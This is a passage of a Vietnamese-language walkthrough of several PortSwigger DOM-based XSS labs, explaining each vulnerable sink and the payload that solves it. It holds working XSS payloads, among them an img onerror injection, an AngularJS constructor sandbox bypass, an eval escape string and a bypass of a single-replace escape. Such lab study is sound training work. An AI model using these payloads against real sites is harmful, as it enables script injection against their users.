    <option>+stores[i]+</option>
</select>
```
Tạo biến `store` lấy từ `storeId` ở `window.location.search`
```javascript!
var store = (new URLSearchParams(window.location.search)).get('storeId');
```
Sau đó chèn `store` vào ở dòng `<option selected>+store+</option>` mà không encode
-> Đây là chỗ để chèn mã độc 

Khi check stock tại London, sever response như sau:

![image](https://hackmd.io/_uploads/SyBazQDuze.png)

Vậy để kiểm soát `store`, ta thay đổi param `storeId` để chèn mã HTML 
-> Payload: 
`https://0a0b0014040f973686d77bd90074004f.web-security-academy.net/product?productId=1&storeId=</select><img src='x' onerror='alert(1)'>`
Hoặc là
`https://0a0b0014040f973686d77bd90074004f.web-security-academy.net/product?productId=1&storeId=</select><script>alert(1)</script>`

1. `</select>` để đóng tag và parse chuyển từ chế độ "in select" -> "insertion" để đảm bảo sẽ thực hiện element
2. `<img src='x' onerror='alert(1)'>` hoặc `<script>alert(1)</script>` để thực hiện `alert`
:::warning
```html!
<select name="storeId">
    <option selected>
</select>
<img src='x' onerror='alert(1)'>
    </option>
    <option>'+stores[i]+'</option>
</select>
```
Tag `select` đã được đóng 
-> Tag `option` đã tự động đóng 
-> `</option>` cùng `</select>` ở cuối đoạn code bị bỏ qua mà không gây lỗi
::: 
## DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
#### Đề bài
This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the `ng-app` attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the `alert` function.
#### Solution 
Truy cập vào lab, ta thấy như sau:
![image](https://hackmd.io/_uploads/SkIFRCD_fg.png)
Thử nhập payload `1` ta thấy ảnh ![image](https://hackmd.io/_uploads/r1d7ezOdGx.png)
Source code có 2 đoạn code cần lưu ý: 
1. `ng-app` (aka AngularJS directive) -> Angular JS sẽ quét nội dung của HTML nodes `body`
```html
<body ng-app>
    ...
</body>
```
2. Khi một directive được thêm vào, JavaScript expressions nằm trong `{{...}}` sẽ được thực hiện.
3. Mà input của user được chèn thông qua đoạn code sau
```html!
<section class=blog-header>
    <h1>0 search results for '1'</h1>
    <hr>
</section>
```

Ta nhập thử payload: `{{alert(1)}}` 
-> Lab vẫn chưa solve vì AngularJS expression có scope/context riêng và không cho phép truy cập mọi global JavaScript theo cách JavaScript bình thường làm.

<center>
AngularJS expression
</center>
<center>
 ↓
</center>
<center>
Tìm "alert" trong context mà expression được phép truy cập
</center>
<center>
 ↓
</center>
<center>
không tìm được / không cho truy cập trực tiếp
</center>
<center>
 ↓
</center>
<center>
Không gọi được "alert"
</center>

Vì vậy, ta phải tìm con đường vòng để JavaScript thực thi `alert`
:::info
1. Hàm `Function` giúp ta tạo ra một function mới từ một chuỗi. 
-> Ví dụ: `var f = Function("alert(1)");` -> khi `f();` -> `alert(1)`
2. Thuộc tính `constructor` tìm ra `constructor` (khuôn) của `object` (một hộp chứa các thông tin/thuộc tính.)
-> Ví dụ: 
```javascript!
var p1 = new Person("Hieu");
var p2 = new Person("An");
var p3 = new Person("Nam");
```
-> `constructor` của các `object` p1, p2, p3 chính là Person
-> `p1.constructor` === `Person`
:::

##### Vậy từ thông tin trên, ta có cách làm sau:
<center>object</center>
<center>↓ .constructor</center>
<center>function của object đó</center>
<center>↓ .constructor</center>
<center>constructor của function đó chính là "Function"</center>
<center>↓ ("alert(1)")</center>
<center> tạo một hàm mới để gọi alert (lúc này alert được thực hiện vì alert được gọi trong hàm Function thuộc sự xử lí của JS chứ không phải Angular JS)</center>
<center>↓ ()</center>
<center> để chạy hàm mới đó  </center>

-> Payload: `{{constructor.constructor("alert(1)")()}}`

Ở đây trong `{{ }}` sẽ mặc định gọi object là `$scope` nên ta mới có thể làm như này

##### Một cách sol khác là ta có thể gọi thẳng 1 hàm trong $scope thay vì dùng constructor bước đầu để gọi hàm của object scope

Các hàm của $scope gồm có $on, $emit, $broadcast, $watch,... 

-> Payload:  `{{$on.constructor("alert(1)")()}}`,...

## Reflected DOM XSS
#### Đề bài
This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the `alert()` function.
#### Solution 
Truy cập vào lab, ta thấy:
![image](https://hackmd.io/_uploads/SymA9EF_Me.png)
Nhập thử payload `1` ta có đoạn code cần lưu ý:
```html!
<script src='/resources/js/searchResults.js'></script>
<script>search('search-results')</script>
```
Vậy ta tìm source code của `searchResults.js` có đoạn này cần lưu ý:
```javascript!
eval('var searchResultsObj = ' + this.responseText);
```
:::warning
1. eval() là một hàm nguy hiểm trong JavaScript vì nó thực thi string dưới dạng mã JavaScript động
2. `this.responseText` có dạng string nên chính vì đó không thể 
```javascript 
var searchResultsObj = this.responseText 
```
:::

Với payload trên, response của sever như sau:
```javascript!
{
    "results": [
        {
            "id": 3,
            "title": "The Hearing Test",
            "image": "blog/posts/22.jpg",
            "summary": "A couple of months ago my flatmate went to have his hearing tested. We all thought he was just ignoring us, but as it turned out he was struggling to keep up with the conversations and decided better to be..."
        }
    ],
    "searchTerm": "1"
}
```
Ta thấy input của user được chèn vào ở `searchTerm` nên phải tìm cách thoát ra khỏi `var`, `var searchResultsObj` và chèn `alert`

Ta nhập thử payload `"` nhận thấy đã bị encode:
```javascript!
{"results":[],"searchTerm":"\""}
```
Nhập thử payload `\` thì lại thấy không bị encode và gây ra lỗi:
```javascript!
{"results":[],"searchTerm":"\"}
```
Từ đó ta tận dụng để thoát khỏi `searchTerm` với payload:
`\"}`
```javascript!
{"results":[],"searchTerm":"\\"}"}
```
Khi đó JS có dạng:
```javascript!
var searchResultsObj = {"results":[],"searchTerm":"\\"}"}
```
Vậy để thoát khỏi `var` ta thêm `;` ở payload rồi chèn hàm `alert`, khi đó payload có dạng `\"}; alert();` và JS có dạng:
```javascript!
var searchResultsObj = {"results":[],"searchTerm":"\\"}; alert();"}
```
Vẫn lỗi vì vẫn chưa thể triệt tiêu `"}` ở cuối, ta sử dụng `//` để biến đoạn `"}` trở thành comment 
-> Payload: `\"}; alert(); //`
```javascript!
var searchResultsObj = {"results":[],"searchTerm":"\\"}; alert(); //"}
```
## Stored DOM XSS
#### Đề bài
This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the `alert()` function.
#### Solution 
Truy cập lab ta có giao diện sau:
![image](https://hackmd.io/_uploads/HyqILAKdzg.png)
Viewpost và nhập thử payload sau:
![image](https://hackmd.io/_uploads/BJGYIAK_Ml.png)
Ta có đoạn code cần lưu ý:
```html!
<span id='user-comments'>
<script src='/resources/js/loadCommentsWithVulnerableEscapeHtml.js'></script>
<script>loadComments('/post/comment')</script>
</span>
```
Ta truy cập vào `loadCommentsWithVulnerableEscapeHtml.js` thấy được 3 đoạn code chứa lỗ hổng:
```javascript!
function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```
```javascript!
let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
firstPElement.innerHTML = newInnerHtml
```
```javascript!
let commentBodyPElement = document.createElement("p");
commentBodyPElement.innerHTML = escapeHTML(comment.body);
```

Vì ở đoạn code này chỉ dùng hàm `replace` để thay thế 1 lần thay vì `replaceAll` nên ta có thể nhử rồi chèn mã 

Ta có thể chèn ở author là `Name` hoặc body là `Comment` vì ở trên có 2 đoạn code giống nhau

-> Payload: `<> <img src=x onerror=alert(1)>`, `<> <script>alert(1)</script>`,...
